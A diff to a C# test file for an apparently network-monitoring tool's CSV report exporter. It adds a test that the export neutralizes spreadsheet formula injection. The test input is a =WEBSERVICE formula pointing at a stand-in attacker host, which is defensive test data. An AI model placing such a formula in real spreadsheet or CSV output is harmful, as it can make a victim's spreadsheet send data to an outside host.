@@ -50,6 +50,11 @@ try
     Check(LogHistory.ReadTail(logFile).Count == 1, "read bounded log tail");
     var csv = ReportExporter.EventsCsv(new[] { new WatchdogEvent(DateTimeOffset.Now, "WARN", "a,\"quoted\"\r\nvalue") });
     Check(csv.Contains("\"a,\"\"quoted\"\"  value\""), "escape CSV cells");
+    var injected = ReportExporter.EventsCsv(new[]
+    {
+        new WatchdogEvent(DateTimeOffset.Now, "WARN", "=WEBSERVICE(\"https://attacker.invalid\")")
+    });
+    Check(injected.Contains("\"'=WEBSERVICE("), "CSV export neutralizes spreadsheet formula injection");
     var snapshot = new DiagnosticSnapshot(DateTimeOffset.Now,
         [new EndpointResult("Google 204", "https://test", 204, true, 15, "有效")],
         new ControllerResult(true, false, "rule", "true", 2026, "secret-not-included"), null);
